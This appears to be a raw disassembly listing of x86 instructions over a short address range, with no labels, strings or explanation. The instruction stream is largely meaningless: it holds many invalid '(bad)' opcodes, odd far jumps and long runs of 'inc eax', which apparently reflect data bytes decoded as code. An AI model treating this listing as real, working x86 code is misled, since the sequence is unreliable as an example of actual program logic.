  417986:	ins    BYTE PTR es:[edi],dx
  417987:	push   esp
  417988:	inc    edx
  417989:	adc    esp,esi
  41798b:	jo     0x4179c1
  41798d:	dec    eax
  41798e:	inc    ebx
  41798f:	inc    eax
  417990:	inc    eax
  417991:	inc    eax
  417992:	inc    eax
  417993:	inc    eax
  417994:	inc    eax
  417995:	inc    eax
  417996:	inc    eax
  417997:	inc    DWORD PTR [eax-0x1f]
  41799a:	icebp  
  41799b:	rol    BYTE PTR [esi-0x7e],0x54
  41799f:	add    eax,DWORD PTR [eax-0x41]
  4179a2:	and    eax,0x875aaaa1
  4179a7:	sbb    DWORD PTR [edi+eax*4],esp
  4179aa:	(bad)  [ebp-0x1c]
  4179ad:	xor    ch,BYTE PTR [eax+0x41216c63]
  4179b3:	adc    eax,0x4005e449
  4179b8:	inc    eax
  4179b9:	inc    eax
  4179ba:	inc    eax
  4179bb:	inc    eax
  4179bc:	inc    eax
  4179bd:	inc    eax
  4179be:	inc    eax
  4179bf:	inc    eax
  4179c0:	inc    eax
  4179c1:	les    ebp,FWORD PTR [esi+0x62]
  4179c4:	dec    edi
  4179c5:	bound  esi,QWORD PTR [ebp+0x434fc9d0]
  4179cb:	mov    eax,ds:0x40403c40
  4179d0:	inc    eax
  4179d1:	inc    eax
  4179d2:	inc    eax
  4179d3:	inc    eax
  4179d4:	inc    eax
  4179d5:	inc    eax
  4179d6:	add    dl,ah
  4179d8:	test   DWORD PTR [ecx+0x34],0x6823e8c5
  4179df:	add    eax,0xc48e364f
  4179e4:	arpl   WORD PTR [eax+0x40],ax
  4179e7:	inc    eax
  4179e8:	inc    eax
  4179e9:	inc    eax
  4179ea:	inc    eax
  4179eb:	and    eax,0xf7404040
  4179f0:	add    eax,0x2668bfa2
  4179f5:	and    edi,DWORD PTR [ecx]
  4179f7:	inc    eax
  4179f8:	scas   eax,DWORD PTR es:[edi]
  4179f9:	jle    0x4179ba
  4179fb:	push   esp
  4179fc:	enter  0xe3d6,0x35
  417a00:	push   eax
  417a01:	gs mov bh,0x3e
  417a04:	inc    eax
  417a05:	inc    eax
  417a06:	inc    eax
  417a07:	inc    eax
  417a08:	inc    eax
  417a09:	inc    eax
  417a0a:	inc    eax
  417a0b:	inc    eax
  417a0c:	inc    eax
  417a0d:	inc    eax
  417a0e:	arpl   WORD PTR [edx+0x4d],cx
  417a11:	push   ebx
  417a12:	outs   dx,BYTE PTR ds:[esi]
  417a13:	loopne 0x4179f4
  417a15:	test   al,0xd9
  417a17:	sub    BYTE PTR [ecx],ah
  417a19:	inc    eax
  417a1a:	nop
  417a1b:	adc    eax,0x682445a8
  417a20:	fild   DWORD PTR [eax+0x40]
  417a23:	inc    eax
  417a24:	inc    eax
  417a25:	inc    eax
  417a26:	inc    eax
  417a27:	rol    DWORD PTR [eax+0x40],0x34
  417a2b:	inc    edx
  417a2c:	dec    edi
  417a2d:	add    al,0x77
  417a2f:	fiadd  DWORD PTR [ebx+0x23]
  417a32:	sub    ah,BYTE PTR ds:0x2f347ea
  417a38:	inc    eax
  417a39:	pop    ebx
  417a3a:	inc    edi
  417a3b:	jl     0x4179c9
  417a3d:	iret   
  417a3e:	push   edx
  417a3f:	fsub   DWORD PTR [ecx+eiz*1]
  417a42:	inc    eax
  417a43:	(bad)  
  417a44:	in     al,0x38
  417a46:	sbb    ah,bl
  417a48:	ins    BYTE PTR es:[edi],dx
  417a49:	inc    edx
  417a4a:	cs scas al,BYTE PTR es:[edi]
  417a4c:	inc    ax
  417a4e:	inc    eax
  417a4f:	add    BYTE PTR [eax+0x40],al
  417a52:	inc    eax
  417a53:	inc    eax
  417a54:	inc    eax
  417a55:	inc    eax
  417a56:	inc    ebx
  417a57:	test   eax,0x1de508dc
  417a5c:	dec    edx
  417a5d:	dec    ebp
  417a5e:	les    esp,FWORD PTR [ebx+edi*8+0xa40bf43]
  417a65:	inc    eax
  417a66:	inc    eax
  417a67:	inc    eax
  417a68:	inc    eax
  417a69:	inc    eax
  417a6a:	inc    eax
  417a6b:	inc    eax
  417a6c:	inc    eax
  417a6d:	inc    eax
  417a6e:	inc    eax
  417a6f:	lods   al,BYTE PTR ds:[esi]
  417a70:	dec    ebx
  417a71:	addr16 (bad) 
  417a73:	lds    edx,FWORD PTR [ecx]
  417a75:	pusha  
  417a76:	push   edx
  417a77:	xchg   esi,eax
  417a78:	pop    ecx
  417a79:	jg     0x417aca
  417a7b:	out    dx,eax
  417a7c:	in     eax,0x3f
  417a7e:	cwde   
  417a7f:	adc    eax,0x51bf62f1
  417a84:	dec    ebp
  417a85:	inc    eax
  417a86:	inc    ebx
  417a87:	dec    esp
  417a88:	dec    edx
  417a89:	push   eax
  417a8a:	inc    ecx
  417a8b:	cld    
  417a8c:	and    BYTE PTR [ecx],ah
  417a8e:	add    eax,0x40404040
  417a93:	inc    eax
  417a94:	inc    eax
  417a95:	int3   
  417a96:	jne    0x417ad8
  417a98:	retf   0x38cf
  417a9b:	pusha  
  417a9c:	fs fbld TBYTE PTR cs:[ebp+0x12]
  417aa1:	stc    
  417aa2:	adc    BYTE PTR [eax+ebp*1-0x52fbf35],bh
  417aa9:	sbb    al,0xf4
  417aab:	fs arpl WORD PTR fs:[eax+0x0],ax
  417ab0:	rol    DWORD PTR [eax+0x40],0x40
  417ab4:	inc    eax
  417ab5:	add    BYTE PTR [eax+0x60],al
  417ab8:	out    0x94,eax
  417aba:	ins    DWORD PTR es:[edi],dx
  417abb:	gs cli 
  417abd:	inc    ebx
  417abe:	pop    eax
  417abf:	jmp    0x40e8:0x787d0daa
  417ac6:	jecxz  0x417adf
  417ac8:	or     eax,DWORD PTR [ecx+0x40]
  417acb:	inc    eax
  417acc:	inc    eax
  417acd:	inc    eax
  417ace:	inc    eax
  417acf:	inc    eax
  417ad0:	inc    eax
  417ad1:	inc    eax
  417ad2:	inc    DWORD PTR [eax+0x63]
  417ad5:	inc    eax
  417ad6:	cmp    DWORD PTR [eax+eiz*8],esp
  417ad9:	inc    ecx
  417ada:	iret   
  417adb:	pop    edx
  417adc:	inc    ecx
  417add:	mov    ebp,0x39656ca8
  417ae2:	pop    ss
  417ae3:	add    al,0xec
  417ae5:	outs   dx,DWORD PTR ds:[esi]
  417ae6:	adc    DWORD PTR [edx],esp
  417ae8:	fadd   DWORD PTR [eax+0x2e]
  417aeb:	push   ebp
  417aec:	xor    eax,0x2343acac
  417af1:	and    eax,0x40a892c9
  417af6:	inc    ecx
  417af7:	lds    esi,FWORD PTR [esi+0x5]
  417afa:	inc    eax
  417afb:	inc    eax
  417afc:	inc    eax
  417afd:	inc    eax
  417afe:	inc    eax
  417aff:	inc    eax
  417b00:	inc    eax
  417b01:	inc    eax
  417b02:	inc    eax
  417b03:	inc    eax
  417b04:	jmp    0xafe8c0e
  417b09:	jmp    0x417b2c
  417b0b:	inc    eax
  417b0c:	dec    ecx
  417b0d:	mov    al,ds:0xedd06c94
  417b12:	lahf   
  417b13:	and    dl,BYTE PTR [ecx]
  417b15:	mov    ds:0xd2cb180d,al
  417b1a:	addr16 push ecx
  417b1c:	inc    eax
  417b1d:	inc    eax
  417b1e:	inc    eax
  417b1f:	inc    eax
  417b20:	inc    eax
  417b21:	inc    eax
  417b22:	inc    eax
  417b23:	inc    eax
  417b24:	add    cl,dl
  417b26:	gs inc edx
  417b28:	inc    eax
  417b29:	adc    ah,BYTE PTR [ebx-0x6f5abf5d]
  417b2f:	inc    ecx
  417b30:	mov    ebp,0x607e28a4
  417b35:	push   es
  417b36:	push   esp
  417b37:	mov    WORD PTR [ebp+0x6a],?
  417b3a:	pusha  
  417b3b:	and    eax,0x40404043
  417b40:	inc    eax
  417b41:	inc    eax
  417b42:	inc    eax
  417b43:	and    eax,0x26404040
  417b48:	xchg   ebp,eax
  417b49:	rcl    DWORD PTR [edi-0x15],0x43
  417b4d:	addr16 inc eax
  417b4f:	xchg   esp,eax
  417b50:	push   esi
  417b51:	test   al,0xdc
  417b53:	arpl   WORD PTR [eax-0x1f],ax
  417b56:	inc    eax
  417b57:	inc    eax
  417b58:	inc    eax
  417b59:	inc    eax
  417b5a:	inc    eax
  417b5b:	inc    eax
  417b5c:	inc    eax
  417b5d:	inc    eax
  417b5e:	inc    eax
  417b5f:	inc    eax
  417b60:	xchg   ebp,eax
  417b61:	sub    al,0x8e
  417b63:	adc    BYTE PTR [eax-0x57],ch
  417b66:	and    al,0x82
  417b68:	xor    bl,ch
  417b6a:	mov    bl,0x9c
  417b6c:	loopne 0x417bae
  417b6e:	inc    eax
  417b6f:	inc    eax
  417b70:	inc    eax
  417b71:	inc    eax
  417b72:	inc    eax
  417b73:	rol    DWORD PTR [eax+0x40],0xc5
  417b77:	ins    BYTE PTR es:[edi],dx
  417b78:	arpl   WORD PTR [ebp+0x36],cx
  417b7b:	rol    DWORD PTR ds:0x4f3c5863,0x40
  417b82:	bound  esp,QWORD PTR [esi-0x35]
  417b85:	ret    
  417b86:	mov    esi,0xc930e143
  417b8b:	inc    eax
  417b8c:	inc    eax
  417b8d:	add    BYTE PTR [eax+0x40],al
  417b90:	inc    eax
  417b91:	inc    eax
  417b92:	inc    eax
  417b93:	inc    eax
  417b94:	mov    WORD PTR [eax+ecx*8+0x54],es
  417b98:	lds    ebp,FWORD PTR [ebx+0x4d]
  417b9b:	push   ecx
  417b9c:	addr16 inc esp
  417b9e:	gs sub al,0xd1
  417ba1:	popa   
  417ba2:	inc    eax
  417ba3:	inc    eax
  417ba4:	inc    eax
  417ba5:	inc    eax
  417ba6:	inc    eax
  417ba7:	inc    eax
  417ba8:	inc    eax
  417ba9:	inc    eax
  417baa:	inc    eax
  417bab:	inc    eax
  417bac:	inc    eax
  417bad:	mov    cl,0x29
  417baf:	push   ebx
  417bb0:	test   al,0x28
  417bb2:	into   
  417bb3:	inc    esi
  417bb4:	ins    BYTE PTR es:[edi],dx
  417bb5:	dec    esp
  417bb6:	push   esi
  417bb7:	enter  0x4005,0x40
  417bbb:	inc    eax
  417bbc:	inc    eax
  417bbd:	inc    eax
  417bbe:	inc    eax
  417bbf:	int3   
  417bc0:	jne    0x417c02
  417bc2:	js     0x417b5d
  417bc4:	loope  0x417c11
  417bc6:	mov    esi,0x8cbcd8a
  417bcb:	fsubr  DWORD PTR [ecx]
  417bcd:	inc    edx
  417bce:	stos   DWORD PTR es:[edi],eax
  417bcf:	adc    eax,0x284b45a8
  417bd4:	and    esi,DWORD PTR [esi]
  417bd6:	mov    esi,0x2e411250
  417bdb:	pop    esp
  417bdc:	mov    edi,0xa0ea7140
  417be1:	pop    ecx
  417be2:	fadd   QWORD PTR [ebx+0x64]
  417be5:	inc    eax
  417be6:	add    cl,al
  417be8:	inc    eax
  417be9:	inc    eax
  417bea:	inc    eax
  417beb:	inc    eax
  417bec:	add    BYTE PTR [eax+0x14],al
  417bef:	fst    QWORD PTR [ebp+edx*1-0x40]
  417bf3:	test   al,0x40
  417bf5:	mov    al,ds:0xcbfa3c21
  417bfa:	cmp    al,0x26
  417bfc:	and    al,0x2d
  417bfe:	cli    
  417bff:	sub    BYTE PTR [eax+0x6c3627bc],cl
  417c05:	pop    ebx
  417c06:	inc    ecx
  417c07:	shl    BYTE PTR [edx+0x44],cl
  417c0a:	imul   esp,DWORD PTR [edx-0x2a],0x40404061
  417c11:	inc    eax
  417c12:	inc    eax
  417c13:	inc    eax
  417c14:	inc    eax
  417c15:	inc    eax
  417c16:	inc    DWORD PTR [eax+0x2a]
  417c19:	pop    edi
  417c1a:	dec    esi
  417c1b:	push   ebp
  417c1c:	bound  eax,QWORD PTR [eax+0x43]
  417c1f:	sub    eax,0xcc56ca42
  417c24:	xor    eax,0x1025c55f
  417c29:	rol    BYTE PTR [esi-0x56bf2744],1
  417c2f:	rol    BYTE PTR [edx-0x15],cl
  417c32:	add    eax,0x4043a802
  417c37:	inc    eax
  417c38:	inc    eax
  417c39:	inc    eax
  417c3a:	inc    eax
  417c3b:	inc    eax
  417c3c:	inc    eax
  417c3d:	inc    eax
  417c3e:	inc    eax
  417c3f:	inc    eax
  417c40:	mov    edx,0x59e947e3
  417c45:	and    eax,0x631f2812
  417c4a:	push   ss
  417c4b:	scas   eax,DWORD PTR es:[edi]
  417c4c:	cmp    al,BYTE PTR [eax+0x40]
  417c4f:	inc    eax
  417c50:	inc    eax
  417c51:	inc    eax
  417c52:	inc    eax
  417c53:	inc    eax
  417c54:	inc    eax
  417c55:	add    BYTE PTR [eax+ecx*2+0x42],ah
  417c59:	lods   al,BYTE PTR ds:[esi]
  417c5a:	and    DWORD PTR [eax+0x4c],eax
  417c5d:	push   ebp
  417c5e:	inc    ebp
  417c5f:	inc    edx
  417c60:	imul   ebp,DWORD PTR [eax],0x84614a64
  417c66:	xor    BYTE PTR [esi+0x38],ah
  417c69:	pop    eax
  417c6a:	and    DWORD PTR [eax-0x2c],eax
  417c6d:	inc    eax
  417c6e:	inc    eax
  417c6f:	inc    eax
  417c70:	inc    eax
  417c71:	inc    eax
  417c72:	inc    eax
  417c73:	and    eax,0x15404040
  417c78:	test   al,ch
  417c7a:	cmp    eax,DWORD PTR [ebx+0x53]
  417c7d:	sub    al,0xd8
  417c7f:	cwde   
  417c80:	ret    0xc062
  417c83:	inc    eax
  417c84:	mov    eax,ds:0xadd64b4d
  417c89:	imul   esp,DWORD PTR [edx+0x24],0xffffffff
  417c8d:	inc    eax
  417c8e:	push   ecx
  417c8f:	inc    eax
  417c90:	inc    eax
  417c91:	inc    eax
  417c92:	inc    eax
  417c93:	inc    eax
  417c94:	inc    eax
  417c95:	inc    eax
  417c96:	inc    eax
  417c97:	inc    eax
  417c98:	inc    eax
  417c99:	fs je  0x417cd8
  417c9c:	cld    
  417c9d:	ins    BYTE PTR es:[edi],dx
  417c9e:	idiv   BYTE PTR [esi+0x42]
  417ca1:	cli    
  417ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ca3:	pop    esp
  417ca4:	shl    al,0xad
  417ca7:	inc    eax
  417ca8:	in     eax,0x82
  417caa:	bound  ebp,QWORD PTR [edx]
  417cac:	xor    al,0x4b
  417cae:	bound  edi,QWORD PTR cs:[edx+0x62]
  417cb2:	xchg   esp,eax
  417cb3:	adc    ah,ch
  417cb5:	lds    ebp,FWORD PTR ds:0x67a6a706
  417cbb:	mov    esp,0x404040f4
  417cc0:	inc    eax
  417cc1:	inc    eax
  417cc2:	inc    eax
  417cc3:	rol    DWORD PTR [eax+0x40],0x4e
  417cc7:	sbb    al,BYTE PTR [ebp+0x30]
  417cca:	push   esi
  417ccb:	sbb    DWORD PTR ds:0xa2bcb05,eax
  417cd1:	xchg   BYTE PTR [eax+0x75874265],al
  417cd7:	sbb    al,BYTE PTR [eax-0x77]
  417cda:	inc    eax
  417cdb:	inc    eax
  417cdc:	add    BYTE PTR [eax+0x40],al
  417cdf:	inc    eax
  417ce0:	inc    eax
  417ce1:	inc    eax
  417ce2:	inc    eax
  417ce3:	rol    BYTE PTR [ebp+0x6],0x40
  417ce7:	sbb    DWORD PTR [edi],edi
  417ce9:	sub    ah,al
  417ceb:	in     eax,dx
  417cec:	xor    BYTE PTR [ecx+eax*2+0x2d467828],ch
  417cf3:	gs mov al,0x6a
  417cf6:	inc    esp
  417cf7:	push   esp
  417cf8:	in     eax,0x1a
  417cfa:	sar    al,0x62
  417cfd:	xor    al,0x40
  417cff:	inc    eax
  417d00:	inc    eax
  417d01:	inc    eax
  417d02:	inc    eax
  417d03:	inc    eax
  417d04:	inc    eax
  417d05:	inc    eax
  417d06:	inc    eax
  417d07:	inc    eax
  417d08:	add    BYTE PTR [ecx],al
  417d0a:	dec    edx
  417d0b:	inc    eax
  417d0c:	jns    0x417d4e
  417d0e:	inc    ecx
  417d0f:	rsqrtps xmm0,XMMWORD PTR [edx+eiz*2+0x24]
  417d14:	jae    0x417d56
  417d16:	arpl   WORD PTR [edx],sp
  417d18:	add    eax,0x5062f4e
  417d1d:	inc    esp
  417d1e:	lods   al,BYTE PTR ds:[esi]
  417d1f:	pusha  
  417d20:	xchg   eax,ebp
  417d22:	popa   
  417d23:	inc    eax
  417d24:	mov    edi,0x40404040
  417d29:	inc    eax
  417d2a:	inc    eax
  417d2b:	int3   
  417d2c:	jne    0x417d6e
  417d2e:	ret    0x7a05
  417d31:	inc    eax
  417d32:	inc    ebx
  417d33:	jecxz  0x417d6c
  417d35:	icebp  
  417d36:	test   eax,0x8445bd43
  417d3b:	mov    ebp,0xbcb04206
  417d40:	gs daa 
  417d42:	mov    dl,BYTE PTR [edx+0x40]
  417d45:	jp     0x417d8c
  417d47:	inc    ecx
  417d48:	inc    eax
  417d49:	add    cl,al
  417d4b:	inc    eax
  417d4c:	inc    eax
  417d4d:	inc    eax
  417d4e:	inc    eax
  417d4f:	add    BYTE PTR [eax+0xc],al
  417d52:	add    eax,0x5332e156
  417d57:	push   ds
  417d58:	das    
  417d59:	mov    ah,0x87
  417d5b:	fldcw  WORD PTR [ecx+0x6e]
  417d5e:	adc    DWORD PTR [eax+eax*2+0x40],ebp
  417d62:	inc    eax
  417d63:	inc    eax
  417d64:	inc    eax
  417d65:	inc    eax
  417d66:	inc    eax
  417d67:	inc    eax
  417d68:	inc    DWORD PTR [eax-0x2c]
  417d6b:	imul   eax,DWORD PTR [eax-0x6e],0xffffffa9
  417d6f:	inc    eax
  417d70:	arpl   WORD PTR [ebx+0x63],sp
  417d73:	xchg   ebx,eax
  417d74:	inc    esp
  417d75:	and    eax,0x50d9244f
  417d7a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  417d7c:	aas    
  417d7d:	add    ecx,esp
  417d7f:	jmp    0x4040:0x40240f56
  417d86:	inc    eax
  417d87:	inc    eax
  417d88:	inc    eax
  417d89:	inc    eax
  417d8a:	inc    eax
  417d8b:	inc    eax
  417d8c:	inc    eax
  417d8d:	push   ebx
  417d8e:	push   edx
  417d8f:	jne    0x417dd9
  417d91:	xor    bl,BYTE PTR [esi+0x65]
  417d94:	ins    DWORD PTR es:[edi],dx
  417d95:	icebp  
  417d96:	add    eax,0x75426228
  417d9b:	push   esp
  417d9c:	mov    cl,0x69
  417d9e:	xchg   DWORD PTR [eax+0x23],edx
  417da1:	and    bl,BYTE PTR [ebp+edi*1+0x7d]
  417da5:	inc    eax
  417da6:	inc    eax
  417da7:	inc    eax
  417da8:	inc    eax
  417da9:	inc    eax
  417daa:	inc    eax
  417dab:	inc    eax
  417dac:	inc    eax
  417dad:	add    cl,dl
  417daf:	inc    eax
  417db0:	add    dl,BYTE PTR [esi]
  417db2:	cmp    al,0x72
  417db4:	ret    
  417db5:	and    BYTE PTR [ebx+0x45],0xc9
  417db9:	loop   0x417dfd
  417dbb:	fimul  WORD PTR [ebx+eiz*2-0x7a]
  417dbf:	or     eax,DWORD PTR [ebp+0x33]
  417dc2:	cmp    BYTE PTR [ebp+0x5269b89b],ah
  417dc8:	inc    ebx
  417dc9:	sub    al,0x40
  417dcb:	xchg   esp,eax
  417dcc:	iret   
  417dcd:	add    eax,0x64d04fd1
  417dd2:	xor    BYTE PTR [eax+0x40404040],ah
  417dd8:	inc    eax
  417dd9:	inc    eax
  417dda:	and    eax,0xe5404040
  417ddf:	retf   
  417de0:	inc    ecx
  417de1:	hlt    
  417de2:	dec    ebx
  417de3:	mov    ch,0x40
  417de5:	mov    esi,0xe060019c
  417dea:	loopne 0x417e19
  417dec:	jae    0x417de8
  417dee:	xor    al,0x13
  417df0:	inc    esp
  417df1:	dec    edi
  417df2:	mov    ah,0x6d
  417df4:	loopne 0x417dd6
  417df6:	inc    eax
  417df7:	bound  ebp,QWORD PTR [ebp+edx*8+0x40]
  417dfb:	inc    eax
  417dfc:	inc    eax
  417dfd:	inc    eax
  417dfe:	inc    eax
  417dff:	inc    eax
  417e00:	inc    eax
  417e01:	inc    eax
  417e02:	inc    eax
  417e03:	inc    eax
  417e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e05:	in     eax,0x40
  417e07:	jno    0x417e51
  417e09:	pushf  
  417e0a:	ror    DWORD PTR [edi],0xa8
  417e0d:	inc    ebx
  417e0e:	jno    0x417db3
  417e10:	pop    eax
  417e11:	inc    ebp
  417e12:	lds    edx,FWORD PTR gs:[ecx]
  417e15:	and    edx,esp
  417e17:	mov    edi,0x4f0421a3
  417e1c:	mov    esp,0x40224045
  417e21:	inc    eax
  417e22:	inc    eax
  417e23:	inc    eax
  417e24:	inc    eax
  417e25:	inc    eax
  417e26:	rol    DWORD PTR [eax+0x40],0x67
  417e2a:	xchg   ecx,eax
  417e2b:	add    ch,BYTE PTR [eax+0xd]
  417e2e:	jecxz  0x417e55
  417e30:	add    BYTE PTR gs:[edi+edi*2+0x4078cb8f],ch
  417e38:	dec    edx
  417e39:	xor    BYTE PTR ds:0x4040919e,al
  417e3f:	add    BYTE PTR [eax+0x40],al
  417e42:	inc    eax
  417e43:	inc    eax
  417e44:	inc    eax
  417e45:	inc    eax
  417e46:	mov    ecx,0x62a83ae3
  417e4b:	inc    ebp
  417e4c:	push   edx
  417e4d:	push   0x40753a
  417e52:	lods   al,BYTE PTR ds:[esi]
  417e53:	xor    ebp,DWORD PTR [ebp-0x33]
  417e56:	imul   ebp,DWORD PTR gs:[ecx],0x5cacc1b3
  417e5d:	daa    
  417e5e:	xchg   esp,eax
  417e5f:	arpl   WORD PTR [eax-0x6a],sp
  417e62:	ins    BYTE PTR es:[edi],dx
  417e63:	cmp    eax,0xb1283464
  417e68:	inc    eax
  417e69:	inc    eax
  417e6a:	inc    eax
  417e6b:	inc    eax
  417e6c:	inc    eax
  417e6d:	inc    eax
  417e6e:	inc    eax
  417e6f:	inc    eax
  417e70:	inc    eax
  417e71:	inc    eax
  417e72:	inc    eax
  417e73:	pushf  
  417e74:	jle    0x417e39
  417e76:	mov    eax,0x33ce4c62
  417e7b:	xchg   esp,eax
  417e7c:	arpl   WORD PTR [eax+edi*1+0x402102f9],di
  417e83:	and    eax,DWORD PTR [ecx+0x15]
  417e86:	xor    DWORD PTR [eax+0x40],eax
  417e89:	inc    eax
  417e8a:	inc    eax
  417e8b:	inc    eax
  417e8c:	inc    eax
  417e8d:	int3   
  417e8e:	jne    0x417ed0
  417e90:	mov    eax,0xd06d3fc9
  417e95:	in     al,dx
  417e96:	leave  
  417e97:	push   ebx
  417e98:	test   al,0xb8
  417e9a:	dec    ebx
  417e9b:	inc    eax
  417e9c:	dec    edi
  417e9d:	inc    eax
  417e9e:	add    cl,al
  417ea0:	inc    eax
  417ea1:	inc    eax
  417ea2:	inc    eax
  417ea3:	inc    eax
  417ea4:	add    BYTE PTR [eax+0x15],al
  417ea7:	test   al,0xb4
  417ea9:	adc    BYTE PTR ds:0x29dd3461,al
  417eaf:	adc    eax,0x40cbaca2
  417eb4:	inc    eax
  417eb5:	inc    eax
  417eb6:	inc    eax
  417eb7:	inc    eax
  417eb8:	inc    eax
  417eb9:	inc    eax
  417eba:	inc    eax
  417ebb:	inc    DWORD PTR [eax+0x1d]
  417ebe:	inc    eax
  417ebf:	xor    al,0x21
  417ec1:	inc    ebx
  417ec2:	xchg   ecx,eax
  417ec3:	inc    edx
  417ec4:	dec    edi
  417ec5:	test   eax,0x4662aa2e
  417eca:	bound  esp,QWORD PTR [ecx]
  417ecc:	inc    edi
  417ecd:	pusha  
  417ece:	inc    eax
  417ecf:	stos   DWORD PTR es:[edi],eax
  417ed0:	inc    ecx
  417ed1:	add    BYTE PTR [ecx-0x3c],dh
  417ed4:	sub    al,0x59
  417ed6:	inc    eax
  417ed7:	inc    eax
  417ed8:	inc    eax
  417ed9:	inc    eax
  417eda:	inc    eax
  417edb:	inc    eax
  417edc:	inc    eax
  417edd:	inc    eax
  417ede:	inc    eax
  417edf:	inc    eax
  417ee0:	and    al,0x90
  417ee2:	cwde   
  417ee3:	shr    BYTE PTR [ecx+eax*2-0x50bf9eab],0x21
  417eeb:	fs aaa 
  417eed:	sub    bl,cl
  417eef:	imul   esp,DWORD PTR [esi],0x90d3a8f0
  417ef5:	adc    cl,BYTE PTR [eax+0x2b]
  417ef8:	inc    eax
  417ef9:	mov    al,BYTE PTR [eax+0x40]
  417efc:	inc    eax
  417efd:	inc    eax
  417efe:	inc    eax
  417eff:	inc    eax
  417f00:	inc    eax
  417f01:	inc    eax
  417f02:	add    BYTE PTR [ecx],dl
  417f04:	xor    BYTE PTR [ebx-0x8],dl
  417f07:	inc    eax
  417f08:	popa   
  417f09:	pusha  
  417f0a:	pop    edi
  417f0b:	pop    esp
  417f0c:	outs   dx,BYTE PTR ds:[esi]
  417f0d:	(bad)  
  417f0e:	adc    eax,0xb8406627
  417f13:	inc    ecx
  417f14:	pop    esi
  417f15:	test   al,0xcd
  417f17:	ins    BYTE PTR es:[edi],dx
  417f18:	gs inc eax
  417f1a:	inc    eax
  417f1b:	inc    eax
  417f1c:	inc    eax
  417f1d:	inc    eax
  417f1e:	inc    eax
  417f1f:	and    eax,0x7b404040
  417f24:	mov    al,BYTE PTR [ebp+0x7b]
  417f27:	inc    ebp
  417f28:	adc    DWORD PTR [edx+0x3c],ecx
  417f2b:	dec    eax
  417f2c:	outs   dx,BYTE PTR ds:[esi]
  417f2d:	xor    dh,al
  417f2f:	sub    ah,BYTE PTR [eax+0x1244a346]
  417f35:	inc    ecx
  417f36:	arpl   WORD PTR [edi],bx
  417f38:	inc    ebp
  417f39:	sub    DWORD PTR [edi+0x40404040],ecx
  417f3f:	inc    eax
  417f40:	inc    eax
  417f41:	inc    eax
  417f42:	inc    eax
  417f43:	inc    eax
  417f44:	inc    eax
  417f45:	jo     0x417f42
  417f47:	cwde   
  417f48:	mov    eax,0x9cb4c34
  417f4d:	ret    0x30ad
  417f50:	adc    eax,0xe2f66443
  417f55:	dec    eax
  417f56:	jmp    0x6cac4b03
  417f5b:	or     al,0x33
  417f5d:	inc    eax
  417f5e:	dec    ebx
  417f5f:	adc    ah,BYTE PTR [ebp+0x4040403c]
  417f65:	inc    eax
  417f66:	inc    eax
  417f67:	inc    eax
  417f68:	rol    DWORD PTR [eax+0x40],0x2a
  417f6c:	push   ebx
  417f6d:	push   cs
  417f6e:	js     0x417f04
  417f70:	je     0x417fa9
  417f72:	push   0x68
  417f74:	scas   al,BYTE PTR es:[edi]
  417f75:	in     eax,0x40
  417f77:	and    BYTE PTR [ecx-0x60],al
  417f7a:	jg     0x417fb1
  417f7c:	sub    BYTE PTR [edi],bh
  417f7e:	arpl   WORD PTR [ebx+0x45],bx
  417f81:	jnp    0x417f5f
  417f83:	fiadd  WORD PTR [ebp+edi*4+0x40]
  417f87:	mov    BYTE PTR [eax],dh
  417f89:	dec    ebp
  417f8a:	push   esp
  417f8b:	add    BYTE PTR [eax+0x40],0x0
  417f8f:	inc    eax
  417f90:	inc    eax
  417f91:	inc    eax
  417f92:	inc    eax
  417f93:	inc    eax
  417f94:	inc    eax
  417f95:	add    DWORD PTR [esi+0x7a],eax
  417f98:	jecxz  0x417fdb
  417f9a:	arpl   WORD PTR [esp+ebx*2],cx
  417f9d:	inc    ebp
  417f9e:	mov    eax,ds:0xa8982740
  417fa3:	ins    DWORD PTR es:[edi],dx
  417fa4:	and    BYTE PTR [ebx+0x57],al
  417fa7:	xor    ch,BYTE PTR [ebx+0x3f]
  417faa:	adc    eax,0xe180491d
  417faf:	rcr    BYTE PTR [esi],0xa8
  417fb2:	retf   
  417fb3:	cld    
  417fb4:	and    BYTE PTR [ebx+0x41],cl
  417fb7:	jo     0x41802c
  417fb9:	adc    BYTE PTR [edi+0x40],ah
  417fbc:	inc    eax
  417fbd:	inc    eax
  417fbe:	inc    eax
  417fbf:	inc    eax
  417fc0:	inc    eax
  417fc1:	inc    eax
  417fc2:	inc    eax
  417fc3:	inc    eax
  417fc4:	inc    eax
  417fc5:	push   edx
  417fc6:	imul   esi,eax,0x60
  417fc9:	inc    eax
  417fca:	cwde   
  417fcb:	ins    BYTE PTR es:[edi],dx
  417fcc:	xor    al,0xd
  417fce:	test   al,0x64
  417fd0:	cmp    ch,BYTE PTR [esi+esi*2]
  417fd3:	inc    ecx
  417fd4:	inc    eax
  417fd5:	inc    eax
  417fd6:	inc    eax
  417fd7:	inc    eax
  417fd8:	inc    eax
  417fd9:	inc    eax
  417fda:	int3   
  417fdb:	jne    0x41801d
  417fdd:	inc    eax
  417fde:	rcl    BYTE PTR [edx],1
  417fe0:	inc    ebx
  417fe1:	inc    BYTE PTR [eax-0x71]
  417fe4:	inc    ebp
  417fe5:	test   al,0x21
  417fe7:	mov    al,ds:0x32f40e1
  417fec:	xor    BYTE PTR [edx+eiz*2+0x15],al
  417ff0:	jbe    0x418013
  417ff2:	inc    eax
  417ff3:	repnz inc ecx
  417ff5:	addr16 inc esi
  417ff7:	inc    edx
  417ff8:	cmp    ebp,edx
  417ffa:	inc    eax
  417ffb:	add    cl,al
  417ffd:	inc    eax
  417ffe:	inc    eax
  417fff:	inc    eax
  418000:	inc    eax
  418001:	add    BYTE PTR [eax+0x23],al
  418004:	sbb    BYTE PTR [eax-0x4da1257c],0xa1
  41800b:	inc    eax
  41800c:	add    dh,cl
  41800e:	arpl   cx,cx
  418010:	enter  0x5928,0x62
  418014:	mov    gs,WORD PTR [eax+0x40402cc7]
  41801a:	inc    eax
  41801b:	inc    eax
  41801c:	inc    eax
  41801d:	inc    eax
  41801e:	inc    eax
  41801f:	inc    eax
  418020:	inc    DWORD PTR [eax+0x24]
  418023:	inc    ecx
  418024:	and    al,0xc0
  418026:	cli    
  418027:	adc    ecx,esp
  418029:	add    BYTE PTR [eax-0x700ada37],dl
  41802f:	fs int 0x4e
  418032:	inc    eax
  418033:	inc    ebx
  418034:	outs   dx,BYTE PTR ds:[esi]
  418035:	add    ebp,esi
  418037:	inc    ecx
  418038:	dec    ebx
